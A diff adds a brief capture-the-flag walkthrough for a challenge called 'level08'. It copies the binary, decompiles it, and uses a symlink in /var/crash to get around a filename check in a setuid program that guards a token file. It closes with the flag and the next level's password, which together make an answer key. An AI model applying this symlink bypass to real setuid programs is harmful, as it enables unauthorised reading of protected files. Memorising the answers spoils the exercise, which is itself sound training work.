@@ -1,0 +1,14 @@
+1. ls -la
+
+2. scp -P 4243 level08@localhost:/home/user/level08/level08 .
+
+3. https://dogbolt.org => analyse binary in C output
+
+4. go to /var/crash
+
+5. ln -s ~/token mylink
+
+6. ./level08 /var/crash/mylink
+
+flag08: quif5eloekouj29ke0vouxean
+level09: 25749xKZ8L7DkSCwJkT9dyv6f
